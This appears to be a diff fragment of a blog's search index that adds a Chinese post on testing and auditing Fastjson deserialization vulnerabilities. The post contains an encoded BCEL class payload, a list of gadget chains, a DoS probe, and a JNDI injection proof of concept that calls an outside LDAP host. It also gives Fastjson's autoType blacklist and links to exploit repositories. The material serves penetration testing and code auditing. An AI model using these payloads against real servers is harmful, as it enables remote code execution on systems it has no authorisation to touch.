&quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$7d$91$cfN$C1$Q$c6$bf$c2$$$c5$ba$C$o$e2$3fD$b8$n$HI$bcJ$bc$YM$d0U$P$Q$8e$seidq$dd$dd$y$8b$f1$8d$3csQ$e3$c1$H$f0$a1$8c$b3$F5$5el$d2$99$ce7$9d_$a7$ed$c7$e7$db$3b$80C$d4$F$b2$d801$li$81Mlql$L$98$d8$e1$a8p$ec2d$da$ae$ef$c6$c7$M$e9$c6$7e$9f$c18$J$86$8a$no$bb$be$ba$9a$de$PT$d4$93$D$8f$94$a2$j8$d2$eb$cb$c8M$e2$85h$c4$pw$c2$c0$ed$89$a7Tx$c4$90m$3b$de$82$c7$u_$b3$c7$f2A$b6$3c$e9$df$b6$3a$7e$ac$a2h$g$c6jx$fa$e8$a80v$D$9f$wV$ba$b1t$ee$$e$a8$91$d4$j$83$e8$G$d3$c8Qgnr$84$d0$e8$83$84ca$J$82$a3j$a1$82$3d$86$ea$ffl$L5$I$GS$d73$U$7ew_$P$c6$ca$89$ffH$bdQ$a4$e4$90$$$d48O$5e$n$lF$ae$l$eb$cez$91t$U$ea$e0$f4$94$c9H$81$rm$90$5d$a6$a8E$9e$917$9b$_$603$9d$b6$c8f$b4H$97$pk$cd7$m$87$3c$f9$y$K$3f$c57$g$G$e4KH$bd$c2xB$f6$a2$f9$8c$ccL$8b$Z$3a$c5DZ$e3$caH$fe$d0$m$8dkU$d0$wG$a8o$bc$a0$dc$w$8a$U$ad$d1$e4Hu8J$G$r$d6uG$e5$_$H$X$vT$R$C$A$A&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="黑白盒测试方法"><a href="#黑白盒测试方法" class="headerlink" title="黑白盒测试方法"></a>黑白盒测试方法</h2><h3 id="利用链及版本"><a href="#利用链及版本" class="headerlink" title="利用链及版本"></a>利用链及版本</h3><table>
+<thead>
+<tr>
+<th>Payload</th>
+<th>PayloadType</th>
+<th>Dependencies</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>BasicDataSource</td>
+<td>local</td>
+<td>tomcat-dbcp:7.x, tomcat-dbcp:9.x, commons-dbcp:1.4</td>
+</tr>
+<tr>
+<td>JdbcRowSetImpl</td>
+<td>jndi</td>
+<td>Fastjson 1.2.47及以下</td>
+</tr>
+<tr>
+<td>TemplatesImp</td>
+<td>local</td>
+<td>need Feature.SupportNonPublicField</td>
+</tr>
+</tbody></table>
+<h3 id="黑盒测试"><a href="#黑盒测试" class="headerlink" title="黑盒测试"></a>黑盒测试</h3><p>  1.目标站点如果报错的话一般使用不闭合{花括号或者多添加”双引号来进行测试</p>
+<p>  2.fastjson与jackson区别，如果请求包中的 json 如下:<br>    {“name”:”S”, “age”:21}<br>    追加一个随机 key ,修改 json 为<br>    {“name”:”S”, “age”:21,”agsbdkjada__ss_d”:123}<br>    这里 fastjson 是不会报错的, Jackson 因为强制 key 与 javabean 属性对齐,只能 少不能多 key,<br>    所以会报错,服务器的响应包中多少会有异常回显</p>
+<p>  3.dos检测 dos<br>    {“a:”\x  看返回时间</p>
+<p>  4.如果是json字符串中name字段存在反序列化<br>    {“id”:”1”,”name”:”wangwei”}那么poc就是<br>    {“id”:”1”,”name”:{“@type”:”java.lang.Class”,”val”:”com.sun.rowset.JdbcRowSetImpl”},”x”:{“@type”:”com.sun.rowset.JdbcRowSetImpl”,”dataSourceName”:”ldap://fatjaon.tuq75v.ceye.io”,”autoCommit”:true}}</p>
+<p><strong>小tips</strong><br>1.在测试过程中发现只要回显比较慢，或者感觉卡顿都有可能是正在执行命令，所以比较慢<br>2.poc.java文件用低版本的java环境编译，因为java是向下兼容的，防止目标环境加载的时候运行报错，最好是jdk1.6</p>
+<h3 id="白盒审计函数"><a href="#白盒审计函数" class="headerlink" title="白盒审计函数"></a>白盒审计函数</h3><p>   1.查看fastjson jar包是否小于1.2.48<br>    2.审查以下函数<br>    JSON.parseObject（）<br>    JSONObject.parseObject（）<br>    JSON.parseAarry（）</p>
+<h3 id="黑名单"><a href="#黑名单" class="headerlink" title="黑名单"></a>黑名单</h3><p><code>config.checkAutoType(typeName)</code></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bsh</span><br><span class="line">com.mchange</span><br><span class="line">com.sun.</span><br><span class="line">java.lang.Thread</span><br><span class="line">java.net.Socket</span><br><span class="line">java.rmi</span><br><span class="line">javax.xml</span><br><span class="line">org.apache.bcel</span><br><span class="line">org.apache.commons.beanutils</span><br><span class="line">org.apache.commons.collections.Transformer</span><br><span class="line">org.apache.commons.collections.functors</span><br><span class="line">org.apache.commons.collections4.comparators</span><br><span class="line">org.apache.commons.fileupload</span><br><span class="line">org.apache.myfaces.context.servlet</span><br><span class="line">org.apache.tomcat</span><br><span class="line">org.apache.wicket.util</span><br><span class="line">org.codehaus.groovy.runtime</span><br><span class="line">org.hibernate</span><br><span class="line">org.jboss</span><br><span class="line">org.mozilla.javascript</span><br><span class="line">org.python.core</span><br><span class="line">org.springframework</span><br></pre></td></tr></table></figure>
+<p><a href="https://github.com/alibaba/fastjson/commit/d52085ef54b32dfd963186e583cbcdfff5d101b5" target="_blank" rel="noopener">https://github.com/alibaba/fastjson/commit/d52085ef54b32dfd963186e583cbcdfff5d101b5</a></p>
+<p><strong>参考</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;c0ny1&#x2F;FastjsonExploit</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;shengqi158&#x2F;fastjson-remote-code-execute-poc</span><br><span class="line">https:&#x2F;&#x2F;www.cnblogs.com&#x2F;hac425&#x2F;p&#x2F;9800288.html</span><br><span class="line">https:&#x2F;&#x2F;blog.csdn.net&#x2F;yaofeino1&#x2F;article&#x2F;details&#x2F;76377080</span><br><span class="line">https:&#x2F;&#x2F;blog.riskivy.com&#x2F;无损检测fastjson-dos漏洞以及盲区分fastjson与jackson组件&#x2F;</span><br><span class="line">https:&#x2F;&#x2F;kingx.me&#x2F;Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>反编译</category>
+      </categories>
+      <tags>
+        <tag>代码审计</tag>
       </tags>
   </entry>
 </search>
